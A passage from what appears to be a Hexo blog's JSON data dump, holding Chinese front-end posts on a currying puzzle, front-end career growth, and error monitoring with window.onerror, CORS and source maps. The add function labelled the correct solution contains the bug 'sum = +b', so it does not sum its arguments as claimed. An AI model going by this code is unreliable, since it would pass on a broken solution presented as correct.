class=\"line\"><span class=\"string\">\"script\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"string\">\"release\"</span>: <span class=\"string\">\"standard-version\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>npm run release 生成 CHANGELOG</li>\n</ul>\n"},{"title":"add(1)(2)(3)解题思路","date":"2017-02-08T04:56:49.000Z","_content":"\n## 投机解法\n\n> 当时第一眼看到这个题目的时候，第一反应就是函数里返回一个新的函数\n\n* 一个不灵活的解决方案,不具备拓展性\n\n```javascript\nfunction add(a) {\n  return function(b) {\n    return function(c) {\n      return a + b + c;\n    };\n  };\n}\nadd(1)(2)(3)=6\n```\n\n## 正确解法\n\n* 函数最终的和要保存一个闭包当中\n\n```javascript\nfunction add(a) {\n  //sum保存于闭包之中\n  let sum = a;\n  let tmp = function(b) {\n    sum = +b;\n    //返回自己方便日后调用\n    return tmp;\n  };\n  //如果到这里什么都不写，那么console.log(add(1)(2)(3))是add这个函数的定义\n  //console.log有些情况下会调用toString和valueOf方法，所以我们重写这个方法\n  tmp.valueOf = tmp.toString = function() {\n    return sum;\n  };\n  return tmp;\n}\n```\n","source":"_posts/add.md","raw":"---\ntitle: add(1)(2)(3)解题思路\ndate: 2017-02-08 12:56:49\ntags: javascript\n---\n\n## 投机解法\n\n> 当时第一眼看到这个题目的时候，第一反应就是函数里返回一个新的函数\n\n* 一个不灵活的解决方案,不具备拓展性\n\n```javascript\nfunction add(a) {\n  return function(b) {\n    return function(c) {\n      return a + b + c;\n    };\n  };\n}\nadd(1)(2)(3)=6\n```\n\n## 正确解法\n\n* 函数最终的和要保存一个闭包当中\n\n```javascript\nfunction add(a) {\n  //sum保存于闭包之中\n  let sum = a;\n  let tmp = function(b) {\n    sum = +b;\n    //返回自己方便日后调用\n    return tmp;\n  };\n  //如果到这里什么都不写，那么console.log(add(1)(2)(3))是add这个函数的定义\n  //console.log有些情况下会调用toString和valueOf方法，所以我们重写这个方法\n  tmp.valueOf = tmp.toString = function() {\n    return sum;\n  };\n  return tmp;\n}\n```\n","slug":"add","published":1,"updated":"2018-04-14T05:13:21.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034jp000e0iofcboiidh5","content":"<h2 id=\"投机解法\"><a href=\"#投机解法\" class=\"headerlink\" title=\"投机解法\"></a>投机解法</h2><blockquote>\n<p>当时第一眼看到这个题目的时候，第一反应就是函数里返回一个新的函数</p>\n</blockquote>\n<ul>\n<li>一个不灵活的解决方案,不具备拓展性</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">b</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">c</span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> a + b + c;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">add(<span class=\"number\">1</span>)(<span class=\"number\">2</span>)(<span class=\"number\">3</span>)=<span class=\"number\">6</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"正确解法\"><a href=\"#正确解法\" class=\"headerlink\" title=\"正确解法\"></a>正确解法</h2><ul>\n<li>函数最终的和要保存一个闭包当中</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//sum保存于闭包之中</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> sum = a;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> tmp = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">b</span>) </span>&#123;</span><br><span class=\"line\">    sum = +b;</span><br><span class=\"line\">    <span class=\"comment\">//返回自己方便日后调用</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> tmp;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"comment\">//如果到这里什么都不写，那么console.log(add(1)(2)(3))是add这个函数的定义</span></span><br><span class=\"line\">  <span class=\"comment\">//console.log有些情况下会调用toString和valueOf方法，所以我们重写这个方法</span></span><br><span class=\"line\">  tmp.valueOf = tmp.toString = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> tmp;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"投机解法\"><a href=\"#投机解法\" class=\"headerlink\" title=\"投机解法\"></a>投机解法</h2><blockquote>\n<p>当时第一眼看到这个题目的时候，第一反应就是函数里返回一个新的函数</p>\n</blockquote>\n<ul>\n<li>一个不灵活的解决方案,不具备拓展性</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">b</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">c</span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> a + b + c;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">add(<span class=\"number\">1</span>)(<span class=\"number\">2</span>)(<span class=\"number\">3</span>)=<span class=\"number\">6</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"正确解法\"><a href=\"#正确解法\" class=\"headerlink\" title=\"正确解法\"></a>正确解法</h2><ul>\n<li>函数最终的和要保存一个闭包当中</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//sum保存于闭包之中</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> sum = a;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> tmp = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">b</span>) </span>&#123;</span><br><span class=\"line\">    sum = +b;</span><br><span class=\"line\">    <span class=\"comment\">//返回自己方便日后调用</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> tmp;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"comment\">//如果到这里什么都不写，那么console.log(add(1)(2)(3))是add这个函数的定义</span></span><br><span class=\"line\">  <span class=\"comment\">//console.log有些情况下会调用toString和valueOf方法，所以我们重写这个方法</span></span><br><span class=\"line\">  tmp.valueOf = tmp.toString = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> tmp;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"我理解的前端进阶","date":"2018-03-13T03:13:26.000Z","_content":"\n## 简单介绍\n\n* 前端是一个需要广度的职位，感觉如果多了解上下游各部门的相关技术会对工作有极大的帮助。单从比起技术来，眼界跟逻辑思维其实更重要。\n* 从技术上来说，走出前端那一亩三分地，多接触自己不熟悉的技术。当回头看前端的时候往往会有一种豁然开朗的感觉。\n* 现阶段感觉是要接触不同的技术，换种不一样的思维。因为之前也写过 php（用的是国人 tp 框架），初次接触了 mvc 的思想，后来为学校的公众号也写过后台，用的是 python（Django），然后公司现在用的 java 的 spring 那一套（在疯狂补 java 核心卷 I 中...），后端的路已经很成熟的，前端还在探索属于自己的方式。这样看来是豁然开朗了～\n* 萌新 -> 页面重构 -> 前端开发工程师 -> 大前端 -> 前端打杂 -> 团队打杂\n\n## 练级之路\n\n### 可以写出方便维护的代码\n\n* commonjs/cmd/amd(node/sea.js/require.js)\n* es6 module(babel)\n* webpack\n* mvvm 解决 jq 意大利面条\n* 使用 async/await，promise\n\n### 可以写出不容易出错的代码\n\n* 类型检查，不能相信传进来的参数(当然现在有 ts)\n* try-catch 捕获错误\n* window.onerror\n\n### 可以写出性能比较好的代码\n\n* 大量 dom 操作的时候可以批量读，批量写，会用缓存\n* 会使用递归分而治之，将大问题分解成相似的小问题\n\n### 可以灵活使用工具\n\n* charles/whistle 替换本地文件，模拟数据，代理 host\n* 会用 ps 切图，markman 测量工具\n* 各种带语法提示的小插件\n* sourcemap 定位代码\n\n### 知道怎么定位到问题\n\n* 会有 chrome devtool 里面的 network/performance 等，断点调试\n* 网络不通，ping 一下百度\n\n### 常见问题\n\n#### 跨域\n\n* jsonp（get）\n* 服务器代理\n\n#### 安全问题\n\n* xss（不能信任用户的输入，过滤一下输入，转义带有脚本的标签）\n* csrf（所有请求都需要带有 token）\n\n#### 性能问题\n\n* 小文件，快展现\n* 图片资源无损压缩（webp 了解一下）\n* 服务端渲染\n* 预加载\n* dns 预解析\n* web workers 进行大计算\n* [知道浏览器的内部工作原理](https://kb.cnblogs.com/page/129756/)\n\n### 关注新技术，并能快速化为己用\n\n* webaseembly 将 js 转为二进制的规范\n* 小程序\n* pwa\n\n---\n\n> 有感而发于公司内部分享 ppt\n","source":"_posts/fe-progress.md","raw":"---\ntitle: 我理解的前端进阶\ndate: 2018-03-13 11:13:26\ntags: 前端\n---\n\n## 简单介绍\n\n* 前端是一个需要广度的职位，感觉如果多了解上下游各部门的相关技术会对工作有极大的帮助。单从比起技术来，眼界跟逻辑思维其实更重要。\n* 从技术上来说，走出前端那一亩三分地，多接触自己不熟悉的技术。当回头看前端的时候往往会有一种豁然开朗的感觉。\n* 现阶段感觉是要接触不同的技术，换种不一样的思维。因为之前也写过 php（用的是国人 tp 框架），初次接触了 mvc 的思想，后来为学校的公众号也写过后台，用的是 python（Django），然后公司现在用的 java 的 spring 那一套（在疯狂补 java 核心卷 I 中...），后端的路已经很成熟的，前端还在探索属于自己的方式。这样看来是豁然开朗了～\n* 萌新 -> 页面重构 -> 前端开发工程师 -> 大前端 -> 前端打杂 -> 团队打杂\n\n## 练级之路\n\n### 可以写出方便维护的代码\n\n* commonjs/cmd/amd(node/sea.js/require.js)\n* es6 module(babel)\n* webpack\n* mvvm 解决 jq 意大利面条\n* 使用 async/await，promise\n\n### 可以写出不容易出错的代码\n\n* 类型检查，不能相信传进来的参数(当然现在有 ts)\n* try-catch 捕获错误\n* window.onerror\n\n### 可以写出性能比较好的代码\n\n* 大量 dom 操作的时候可以批量读，批量写，会用缓存\n* 会使用递归分而治之，将大问题分解成相似的小问题\n\n### 可以灵活使用工具\n\n* charles/whistle 替换本地文件，模拟数据，代理 host\n* 会用 ps 切图，markman 测量工具\n* 各种带语法提示的小插件\n* sourcemap 定位代码\n\n### 知道怎么定位到问题\n\n* 会有 chrome devtool 里面的 network/performance 等，断点调试\n* 网络不通，ping 一下百度\n\n### 常见问题\n\n#### 跨域\n\n* jsonp（get）\n* 服务器代理\n\n#### 安全问题\n\n* xss（不能信任用户的输入，过滤一下输入，转义带有脚本的标签）\n* csrf（所有请求都需要带有 token）\n\n#### 性能问题\n\n* 小文件，快展现\n* 图片资源无损压缩（webp 了解一下）\n* 服务端渲染\n* 预加载\n* dns 预解析\n* web workers 进行大计算\n* [知道浏览器的内部工作原理](https://kb.cnblogs.com/page/129756/)\n\n### 关注新技术，并能快速化为己用\n\n* webaseembly 将 js 转为二进制的规范\n* 小程序\n* pwa\n\n---\n\n> 有感而发于公司内部分享 ppt\n","slug":"fe-progress","published":1,"updated":"2018-04-13T06:19:17.159Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034jr000f0iofev9q65ve","content":"<h2 id=\"简单介绍\"><a href=\"#简单介绍\" class=\"headerlink\" title=\"简单介绍\"></a>简单介绍</h2><ul>\n<li>前端是一个需要广度的职位，感觉如果多了解上下游各部门的相关技术会对工作有极大的帮助。单从比起技术来，眼界跟逻辑思维其实更重要。</li>\n<li>从技术上来说，走出前端那一亩三分地，多接触自己不熟悉的技术。当回头看前端的时候往往会有一种豁然开朗的感觉。</li>\n<li>现阶段感觉是要接触不同的技术，换种不一样的思维。因为之前也写过 php（用的是国人 tp 框架），初次接触了 mvc 的思想，后来为学校的公众号也写过后台，用的是 python（Django），然后公司现在用的 java 的 spring 那一套（在疯狂补 java 核心卷 I 中…），后端的路已经很成熟的，前端还在探索属于自己的方式。这样看来是豁然开朗了～</li>\n<li>萌新 -&gt; 页面重构 -&gt; 前端开发工程师 -&gt; 大前端 -&gt; 前端打杂 -&gt; 团队打杂</li>\n</ul>\n<h2 id=\"练级之路\"><a href=\"#练级之路\" class=\"headerlink\" title=\"练级之路\"></a>练级之路</h2><h3 id=\"可以写出方便维护的代码\"><a href=\"#可以写出方便维护的代码\" class=\"headerlink\" title=\"可以写出方便维护的代码\"></a>可以写出方便维护的代码</h3><ul>\n<li>commonjs/cmd/amd(node/sea.js/require.js)</li>\n<li>es6 module(babel)</li>\n<li>webpack</li>\n<li>mvvm 解决 jq 意大利面条</li>\n<li>使用 async/await，promise</li>\n</ul>\n<h3 id=\"可以写出不容易出错的代码\"><a href=\"#可以写出不容易出错的代码\" class=\"headerlink\" title=\"可以写出不容易出错的代码\"></a>可以写出不容易出错的代码</h3><ul>\n<li>类型检查，不能相信传进来的参数(当然现在有 ts)</li>\n<li>try-catch 捕获错误</li>\n<li>window.onerror</li>\n</ul>\n<h3 id=\"可以写出性能比较好的代码\"><a href=\"#可以写出性能比较好的代码\" class=\"headerlink\" title=\"可以写出性能比较好的代码\"></a>可以写出性能比较好的代码</h3><ul>\n<li>大量 dom 操作的时候可以批量读，批量写，会用缓存</li>\n<li>会使用递归分而治之，将大问题分解成相似的小问题</li>\n</ul>\n<h3 id=\"可以灵活使用工具\"><a href=\"#可以灵活使用工具\" class=\"headerlink\" title=\"可以灵活使用工具\"></a>可以灵活使用工具</h3><ul>\n<li>charles/whistle 替换本地文件，模拟数据，代理 host</li>\n<li>会用 ps 切图，markman 测量工具</li>\n<li>各种带语法提示的小插件</li>\n<li>sourcemap 定位代码</li>\n</ul>\n<h3 id=\"知道怎么定位到问题\"><a href=\"#知道怎么定位到问题\" class=\"headerlink\" title=\"知道怎么定位到问题\"></a>知道怎么定位到问题</h3><ul>\n<li>会有 chrome devtool 里面的 network/performance 等，断点调试</li>\n<li>网络不通，ping 一下百度</li>\n</ul>\n<h3 id=\"常见问题\"><a href=\"#常见问题\" class=\"headerlink\" title=\"常见问题\"></a>常见问题</h3><h4 id=\"跨域\"><a href=\"#跨域\" class=\"headerlink\" title=\"跨域\"></a>跨域</h4><ul>\n<li>jsonp（get）</li>\n<li>服务器代理</li>\n</ul>\n<h4 id=\"安全问题\"><a href=\"#安全问题\" class=\"headerlink\" title=\"安全问题\"></a>安全问题</h4><ul>\n<li>xss（不能信任用户的输入，过滤一下输入，转义带有脚本的标签）</li>\n<li>csrf（所有请求都需要带有 token）</li>\n</ul>\n<h4 id=\"性能问题\"><a href=\"#性能问题\" class=\"headerlink\" title=\"性能问题\"></a>性能问题</h4><ul>\n<li>小文件，快展现</li>\n<li>图片资源无损压缩（webp 了解一下）</li>\n<li>服务端渲染</li>\n<li>预加载</li>\n<li>dns 预解析</li>\n<li>web workers 进行大计算</li>\n<li><a href=\"https://kb.cnblogs.com/page/129756/\" target=\"_blank\" rel=\"noopener\">知道浏览器的内部工作原理</a></li>\n</ul>\n<h3 id=\"关注新技术，并能快速化为己用\"><a href=\"#关注新技术，并能快速化为己用\" class=\"headerlink\" title=\"关注新技术，并能快速化为己用\"></a>关注新技术，并能快速化为己用</h3><ul>\n<li>webaseembly 将 js 转为二进制的规范</li>\n<li>小程序</li>\n<li>pwa</li>\n</ul>\n<hr>\n<blockquote>\n<p>有感而发于公司内部分享 ppt</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"简单介绍\"><a href=\"#简单介绍\" class=\"headerlink\" title=\"简单介绍\"></a>简单介绍</h2><ul>\n<li>前端是一个需要广度的职位，感觉如果多了解上下游各部门的相关技术会对工作有极大的帮助。单从比起技术来，眼界跟逻辑思维其实更重要。</li>\n<li>从技术上来说，走出前端那一亩三分地，多接触自己不熟悉的技术。当回头看前端的时候往往会有一种豁然开朗的感觉。</li>\n<li>现阶段感觉是要接触不同的技术，换种不一样的思维。因为之前也写过 php（用的是国人 tp 框架），初次接触了 mvc 的思想，后来为学校的公众号也写过后台，用的是 python（Django），然后公司现在用的 java 的 spring 那一套（在疯狂补 java 核心卷 I 中…），后端的路已经很成熟的，前端还在探索属于自己的方式。这样看来是豁然开朗了～</li>\n<li>萌新 -&gt; 页面重构 -&gt; 前端开发工程师 -&gt; 大前端 -&gt; 前端打杂 -&gt; 团队打杂</li>\n</ul>\n<h2 id=\"练级之路\"><a href=\"#练级之路\" class=\"headerlink\" title=\"练级之路\"></a>练级之路</h2><h3 id=\"可以写出方便维护的代码\"><a href=\"#可以写出方便维护的代码\" class=\"headerlink\" title=\"可以写出方便维护的代码\"></a>可以写出方便维护的代码</h3><ul>\n<li>commonjs/cmd/amd(node/sea.js/require.js)</li>\n<li>es6 module(babel)</li>\n<li>webpack</li>\n<li>mvvm 解决 jq 意大利面条</li>\n<li>使用 async/await，promise</li>\n</ul>\n<h3 id=\"可以写出不容易出错的代码\"><a href=\"#可以写出不容易出错的代码\" class=\"headerlink\" title=\"可以写出不容易出错的代码\"></a>可以写出不容易出错的代码</h3><ul>\n<li>类型检查，不能相信传进来的参数(当然现在有 ts)</li>\n<li>try-catch 捕获错误</li>\n<li>window.onerror</li>\n</ul>\n<h3 id=\"可以写出性能比较好的代码\"><a href=\"#可以写出性能比较好的代码\" class=\"headerlink\" title=\"可以写出性能比较好的代码\"></a>可以写出性能比较好的代码</h3><ul>\n<li>大量 dom 操作的时候可以批量读，批量写，会用缓存</li>\n<li>会使用递归分而治之，将大问题分解成相似的小问题</li>\n</ul>\n<h3 id=\"可以灵活使用工具\"><a href=\"#可以灵活使用工具\" class=\"headerlink\" title=\"可以灵活使用工具\"></a>可以灵活使用工具</h3><ul>\n<li>charles/whistle 替换本地文件，模拟数据，代理 host</li>\n<li>会用 ps 切图，markman 测量工具</li>\n<li>各种带语法提示的小插件</li>\n<li>sourcemap 定位代码</li>\n</ul>\n<h3 id=\"知道怎么定位到问题\"><a href=\"#知道怎么定位到问题\" class=\"headerlink\" title=\"知道怎么定位到问题\"></a>知道怎么定位到问题</h3><ul>\n<li>会有 chrome devtool 里面的 network/performance 等，断点调试</li>\n<li>网络不通，ping 一下百度</li>\n</ul>\n<h3 id=\"常见问题\"><a href=\"#常见问题\" class=\"headerlink\" title=\"常见问题\"></a>常见问题</h3><h4 id=\"跨域\"><a href=\"#跨域\" class=\"headerlink\" title=\"跨域\"></a>跨域</h4><ul>\n<li>jsonp（get）</li>\n<li>服务器代理</li>\n</ul>\n<h4 id=\"安全问题\"><a href=\"#安全问题\" class=\"headerlink\" title=\"安全问题\"></a>安全问题</h4><ul>\n<li>xss（不能信任用户的输入，过滤一下输入，转义带有脚本的标签）</li>\n<li>csrf（所有请求都需要带有 token）</li>\n</ul>\n<h4 id=\"性能问题\"><a href=\"#性能问题\" class=\"headerlink\" title=\"性能问题\"></a>性能问题</h4><ul>\n<li>小文件，快展现</li>\n<li>图片资源无损压缩（webp 了解一下）</li>\n<li>服务端渲染</li>\n<li>预加载</li>\n<li>dns 预解析</li>\n<li>web workers 进行大计算</li>\n<li><a href=\"https://kb.cnblogs.com/page/129756/\" target=\"_blank\" rel=\"noopener\">知道浏览器的内部工作原理</a></li>\n</ul>\n<h3 id=\"关注新技术，并能快速化为己用\"><a href=\"#关注新技术，并能快速化为己用\" class=\"headerlink\" title=\"关注新技术，并能快速化为己用\"></a>关注新技术，并能快速化为己用</h3><ul>\n<li>webaseembly 将 js 转为二进制的规范</li>\n<li>小程序</li>\n<li>pwa</li>\n</ul>\n<hr>\n<blockquote>\n<p>有感而发于公司内部分享 ppt</p>\n</blockquote>\n"},{"title":"前端错误收集","date":"2018-02-12T03:27:51.000Z","_content":"\n## 为什么要进行前端的错误进行监控\n\n* 现在网页的要求已经趋近于原生的应用，几乎都是有着大量交互的。面对各种用户，不同的浏览器等等出现的不同问题，有必要进行及时的监控，毕竟有些问题复现也是挺困难的。\n\n## 捕获错误的方法\n\n* try..catch 之前说过，但是它只能在 try 的块里运行才可以捕捉错误，无法捕捉全局的错误事件\n* window.onerror 可以用来捕捉全局的错误,但是它无法捕捉异步错误，我们在 ajax 模块统一埋点\n\n### window.onerror\n\n```javascript\nwindow.onerror=function(message,url,linNo,columnNo,error)\nmessage:错误信息\nurl:发生错误对应的脚本路径，比如是bundle.js\nlineNo:错误发生的行号\ncolunmnNo:错误发生的列号\nerror：具体的error对象，包含更加详细的错误调用堆栈信息\n```\n\n## 常见问题\n\n### Script Error\n\n> 现在我们一般都把资源放在 cdn 上，其他资源在本页面相当于跨域为什么会有这种设置，这是避免数据泄露到不安全的域中。如果我是银行页面，随便引入一个 js 资源，读取了账户密码，那可如何是好。\n\n#### 解决手段\n\n添加信任的域\n\n* 客户端的 script 添加 crossorigin，他的作用就是告诉浏览器，要加载一个其他域的资源，并且信任他\n* 服务端设置**Acess-Control-Allow-Origin**的响应头，可以直接设置为\\*，信任全部资源。cdn 资源应该全部加上 CORS 响应头。\n  > 如果我们使用 nginx 的话，可以像下面那样简单配置\n\n```javascript\nlocation / {\n     root /Users/**;\n     index  index.html index.htm;\n     add_header \"Access-Control-Allow-Origin\" \"*\";\n}\n```\n\n### 代码压缩\n\n> 现代 web 工程都会直接压缩 js 代码，所以线上一般都是只有几行代码但是我们有 sourcemap，可以定位到源代码的位置。但是线上是没有这个东西，我们可以通过[sourcemap](https://github.com/mozilla/source-map/)这个工具来将压缩后的代码生成 sourcemap\n\n* 这里简单介绍一下生成 sourcemap 文件的方式\n\n```javascript\nuglifyjs --source-map 最终生成的map名称 --output 压缩文件名称 原文件名称\n```\n\n* 简单通过 soucemap 定位到源文件的真正行数\n\n```javascript\nlet sourceMap = require(\"source-map\");\nlet mapData = require(\"./test.json\");\nlet consumer = new sourceMap.SourceMapConsumer(mapData);\nlet info = consumer.originalPositionFor({ line: 1, column: 102 });\nconsole.log(info); //{ source: \"test.js\", line: 11, column: 6, name: \"yoki\" }\n```\n\n## 推荐工具\n\n> 由以上可以简单知道前端收集的原理了，但真正到线上肯定是不够的，这里有一些成熟的工具\n\n* [sentry](https://sentry.io)\n* [fundebug](https://www.fundebug.com/)\n\n---\n\n> 分享一篇干货[如何设计一个前端监控系统](http://web.jobbole.com/90033/)\n","source":"_posts/fe-error.md","raw":"---\ntitle: 前端错误收集\ndate: 2018-02-12 11:27:51\ntags:\n---\n\n## 为什么要进行前端的错误进行监控\n\n* 现在网页的要求已经趋近于原生的应用，几乎都是有着大量交互的。面对各种用户，不同的浏览器等等出现的不同问题，有必要进行及时的监控，毕竟有些问题复现也是挺困难的。\n\n## 捕获错误的方法\n\n* try..catch 之前说过，但是它只能在 try 的块里运行才可以捕捉错误，无法捕捉全局的错误事件\n* window.onerror 可以用来捕捉全局的错误,但是它无法捕捉异步错误，我们在 ajax 模块统一埋点\n\n### window.onerror\n\n```javascript\nwindow.onerror=function(message,url,linNo,columnNo,error)\nmessage:错误信息\nurl:发生错误对应的脚本路径，比如是bundle.js\nlineNo:错误发生的行号\ncolunmnNo:错误发生的列号\nerror：具体的error对象，包含更加详细的错误调用堆栈信息\n```\n\n## 常见问题\n\n### Script Error\n\n> 现在我们一般都把资源放在 cdn 上，其他资源在本页面相当于跨域为什么会有这种设置，这是避免数据泄露到不安全的域中。如果我是银行页面，随便引入一个 js 资源，读取了账户密码，那可如何是好。\n\n#### 解决手段\n\n添加信任的域\n\n* 客户端的 script 添加 crossorigin，他的作用就是告诉浏览器，要加载一个其他域的资源，并且信任他\n* 服务端设置**Acess-Control-Allow-Origin**的响应头，可以直接设置为\\*，信任全部资源。cdn 资源应该全部加上 CORS 响应头。\n  > 如果我们使用 nginx 的话，可以像下面那样简单配置\n\n```javascript\nlocation / {\n     root /Users/**;\n     index  index.html index.htm;\n     add_header \"Access-Control-Allow-Origin\" \"*\";\n}\n```\n\n### 代码压缩\n\n> 现代 web 工程都会直接压缩 js 代码，所以线上一般都是只有几行代码但是我们有 sourcemap，可以定位到源代码的位置。但是线上是没有这个东西，我们可以通过[sourcemap](https://github.com/mozilla/source-map/)这个工具来将压缩后的代码生成 sourcemap\n\n* 这里简单介绍一下生成 sourcemap 文件的方式\n\n```javascript\nuglifyjs --source-map 最终生成的map名称 --output 压缩文件名称 原文件名称\n```\n\n* 简单通过 soucemap 定位到源文件的真正行数\n\n```javascript\nlet sourceMap = require(\"source-map\");\nlet mapData = require(\"./test.json\");\nlet consumer = new sourceMap.SourceMapConsumer(mapData);\nlet info = consumer.originalPositionFor({ line: 1, column: 102 });\nconsole.log(info); //{ source: \"test.js\", line: 11, column: 6, name: \"yoki\" }\n```\n\n## 推荐工具\n\n> 由以上可以简单知道前端收集的原理了，但真正到线上肯定是不够的，这里有一些成熟的工具\n\n* [sentry](https://sentry.io)\n* [fundebug](https://www.fundebug.com/)\n\n---\n\n> 分享一篇干货[如何设计一个前端监控系统](http://web.jobbole.com/90033/)\n","slug":"fe-error","published":1,"updated":"2018-04-13T03:07:45.439Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034js000h0iof01ikv8o9","content":"<h2 id=\"为什么要进行前端的错误进行监控\"><a href=\"#为什么要进行前端的错误进行监控\" class=\"headerlink\" title=\"为什么要进行前端的错误进行监控\"></a>为什么要进行前端的错误进行监控</h2><ul>\n<li>现在网页的要求已经趋近于原生的应用，几乎都是有着大量交互的。面对各种用户，不同的浏览器等等出现的不同问题，有必要进行及时的监控，毕竟有些问题复现也是挺困难的。</li>\n</ul>\n<h2 id=\"捕获错误的方法\"><a href=\"#捕获错误的方法\" class=\"headerlink\" title=\"捕获错误的方法\"></a>捕获错误的方法</h2><ul>\n<li>try..catch 之前说过，但是它只能在 try 的块里运行才可以捕捉错误，无法捕捉全局的错误事件</li>\n<li>window.onerror 可以用来捕捉全局的错误,但是它无法捕捉异步错误，我们在 ajax 模块统一埋点</li>\n</ul>\n<h3 id=\"window-onerror\"><a href=\"#window-onerror\" class=\"headerlink\" title=\"window.onerror\"></a>window.onerror</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">window</span>.onerror=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">message,url,linNo,columnNo,error</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">message</span>:错误信息</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">url</span>:发生错误对应的脚本路径，比如是<span class=\"title\">bundle</span>.<span class=\"title\">js</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">lineNo</span>:错误发生的行号</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">colunmnNo</span>:错误发生的列号</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">error</span>：具体的<span class=\"title\">error</span>对象，包含更加详细的错误调用堆栈信息</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"常见问题\"><a href=\"#常见问题\" class=\"headerlink\" title=\"常见问题\"></a>常见问题</h2><h3 id=\"Script-Error\"><a href=\"#Script-Error\" class=\"headerlink\" title=\"Script Error\"></a>Script 